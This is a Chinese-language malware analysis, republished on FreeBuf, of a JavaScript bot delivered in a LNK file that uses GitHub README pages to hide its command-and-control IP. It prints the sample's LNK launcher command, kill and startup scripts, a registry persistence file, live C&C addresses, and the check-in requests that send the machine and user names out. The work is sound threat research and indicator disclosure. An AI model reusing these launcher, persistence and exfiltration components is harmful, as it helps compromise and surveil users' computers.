**最近，在做恶意软的件检测时我们发现了一个LNK文件。该文件利用Github作为其C
&C服务器，并使用了一个新的基于JavaScript的Bot，来在系统上执行恶意活动。**

 **ZIP文件的MD5哈希值：** f444bfe1e65b5e2bef8984c740bd0a49

 **LNK文件的MD5哈希值：** 219dedb53da6b1dce0d6c071af59b45c

 **文件名：** 200_Germany.lnk

配置文件的详细信息在文末部分会提及。

LNK文件的目标如下所示：

    
    
    %comspec% /c copy 2*.lnk %tmp%&%systemdrive%&cd %tmp%&attrib +r *.lnk&for /f "delims=" %a in ('dir /s /b *.LnK') do type "%~fa" | find "p0b2x6">.js &CsCRipt .js  "%~fa"

这个LNK文件包含一个恶意的JavaScript在里面，它将被删除并被cScript执行。

JavaScript内容如下：

![针对使用Github作为C&amp;C服务的JavaScript后门分析](https://image.3001.net/images/20180605/15281518281584.png!small)

它还包了一个CSV的诱饵文件，该文件将在执行后显示给用户。

LNK文件首先会搜索其中包含标记“p0b2x6”的所有行。这些行中的每一行都对应于将用于执行进一步恶意活动的JavaScript。

## 分析JavaScript文件

以下是JavaScript文件执行的主要功能：

1.使用以下WMI查询收集有关机器上运行的AV软件的信息：

    
    
    SELECT displayName FROM AntiVirusProduct

2.通过运行WMI查询收集关于OS版本的信息：

    
    
    SELECT * FROM Win32_OperatingSystem

3.诱饵内容将从LNK文件中提取，并在文件系统上被删除，文件名为：200μGel.CSV。以下是将会显示给用户的诱饵文件：

![针对使用Github作为C&amp;C服务的JavaScript后门分析](https://image.3001.net/images/20180605/15281518546663.png!small)

4.在path中创建Storage目录：%localappdata%\Microsoft\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}"

请注意，环境变量％localappdata％仅在Windows 7及更高版本中存在。

5.使用以下内容在Storage目录中创建一个kill.js文件：

    
    
    var oWMISrvc = GetObject("winmgmts:\\\\.\\root\\cimv2");while(1){WScript.Sleep(180000); cProcNIE();}function cProcNIE() {try {var colProcLst = oWMISrvc.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%-Embedding%' AND Name = 'iexplore.exe'");var objItem = new Enumerator(colProcLst);for(;!objItem.atEnd();objItem.moveNext()) {var p = objItem.item();p.Terminate();}} catch  (e) {}}

这个JS文件的目的是kill任何具有命令行参数匹配的Internet
Explorer的运行实例：“-Embedding”。这样做是因为JavaScript使用InternetExplorer.Application
ActiveX Object来执行C&C通信。

6.使用以下内容在Storage目录中创建一个startup.js文件：

    
    
    var WshShell = new ActiveXObject("WScript.Shell");
    WshShell.Run("C:\\Windows\\System32\\cscript.exe %localappdata%\\Microsoft\\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}\\file.js", 0, 0);

该文件的目的是执行主恶意JavaScript文件。

7.将主JavaScript文件复制到Storage目录中，并将其命名为file.js

8.执行主JavaScript，file.js

9.删除JavaScript的原始实例。

从Storage目录执行主JavaScript时以下操作将被执行。

10.在存储目录中创建一个lck文件h.lck。

11.按照上述步骤5，kill任何正在运行的iexplore.exe实例。

12.在Storage目录中创建一个Windows注册表文件g3r.reg，内容如下：

Windows注册表编辑器版本5.00

    
    
    [HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows]
    "run"="%localappdata%\\Microsoft\\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}\\services.lnk"
    
    [HKEY_CURRENT_USER\Control Panel\Cursors]
    "AppStarting"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,61,00,65,00,72,00,6f,00,5f,00,61,00,72,00,72,00,6f,00,77,00,2e,00,63,00,75,00,72,00,00,00
    
    [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]
    "Check_Associations"="no"
    "NoProtectedModeBanner"=dword:00000001
    "IE10RunOncePerInstallCompleted"=dword:00000001
    
    [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Recovery]
    "AutoRecover"=dword:00000002
    
    [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\PhishingFilter]
    "EnabledV9"=dword:00000001
    
    [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\BrowserEmulation]
    "MSCompatibilityMode"=dword:00000001
    
    [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
    "EnableBalloonTips"=dword:00000000
    
    [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings]
    "GlobalUserOffline"=dword:00000000
    
    [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]
    "2500"=dword:00000003
    
    [HKEY_CURRENT_USER\Software\Piriform\CCleaner]
    "BrowserMonitoring"=-    "(Mon)3001"=-
此注册表文件使用reg import命令执行，并创建指向Storage目录中service.lnk文件的Persistence（持久）注册表项。

13.在Storage目录中创建一个名为Services LNK的快捷方式文件，其目标指向Storage目录中的Stututu.js文件。

##  **C &C通信**

这个样本中最有意思的部分是C&C通信。C&C服务器地址从github中获取，如下所示：

JavaScript调用extract_srvaddr()函数来执行以下主要操作：

1.连接到以下github URL：

> <https://raw.githubusercontent.com/deadpooool/news/master/README.md>
>
> <https://raw.githubusercontent.com/anvaperhdfjkdhud/1234/master/README.md>

寻找模式： "our news start at (.*) thank you"

截图：

![针对使用Github作为C&amp;C服务的JavaScript后门分析](https://image.3001.net/images/20180605/15281518854288.png!small)

2.一旦找到上述模式，它就会提取数字。在我们的示例中为：2077937692956。这串数字是C＆C
IP地址的十进制表示形式其结果为：185.247.211.198。

3.它调用num2dot()函数将上面的数字转换为IP地址。

4.C＆C服务器验证：它使用一种非常有意思的方法来验证C＆C服务器是否为实际预期服务器。 为此，它会构建以下URL：

> http://<C&C_server>/Validate/ValSrv

它连接到上面的URL并查找字符串：youwillnotfindthisanywhare。

请参阅下面的截图：

![针对使用Github作为C&amp;C服务的JavaScript后门分析](https://image.3001.net/images/20180605/15281519191285.png!small)

如果在HTML响应中找到该字符串，则继续执行。

## 数据提取和C＆C命令

基于JavaScript的Bot和C＆C服务器之间的通信，通过InternetExplorer.Application ActiveXObject实例进行。

get_page_content_with_ie()函数用于将GET和POST请求发送至C＆C服务器。

发送的主要请求如下所示：

 **getid：** 发送HTTP POST请求到 **hxxp://185.247.211.198//Validate/getid** ，发送内容如下：

    
    
    action=getSerial&computer_name=<computer_name>&username=<username>&version=1.3&cli=bd

在响应中，C＆C服务器将返回如下所示的ID：

> 1312433611441862

 **getcommand：** 它通过向URL **hxxp://185.247.211.198/Validate/getcommand** 发送HTTP
POST请求，来检索C＆C服务器中的命令，发送内容如下：

    
    
    action=getCommand&uid=<id>

服务器响应内容如下：

    
    
    {'command':'','timeout':'5','interpreter':''}

在验证时，C＆C服务器没有响应命令。

但是，基于JavaScript的静态分析，它将对该命令执行以下操作：

> 1\. 解析命令搜索关键字："download"
>
> 2\. 如果它找到关键字"download"，那么它使用分隔符“|”拆分该值
>
> 3\. 将HTTP GET请求发送到UR:HXXP://185.247.211.1988 /Value/DWnLD？U= <值>以获取响应
>
> 4\. 如果响应为二进制文件，那么文件将被删除并执行
>
> 5\. 否则，命令将直接使用CMD.EXE执行

## 配置文件

URLs:

    
    
    ['https://raw.githubusercontent.com/deadpooool/news/master/README.md','https://raw.githubusercontent.com/anvaperhdfjkdhud/1234/master/README.md'];
    version = "1.3"
    ref = "bd"
    StorageDir = WshShell.ExpandEnvironmentStrings("%localappdata%")+"\\Microsoft\\PackageCache\\{37B8F9C7-03FB-3253-8781-2517C99D7C00}";
    startup_shortcut = services.lnk
    agent_location = file.js
    agent_hidden_executer = startup.js
    g3r = g3r.reg
    agent_id_location = id
    lckFile = h.lck
    ieFile = kill.js
    sctFile = SC7.P7D
    pyFile = main.py
    
    c0d3inj3cT

 ***参考来源：[pwncode](http://www.pwncode.club/2018/05/javascript-based-bot-using-github-c.html)，FB小编 secist 编译，转载请注明来自FreeBuf.COM**

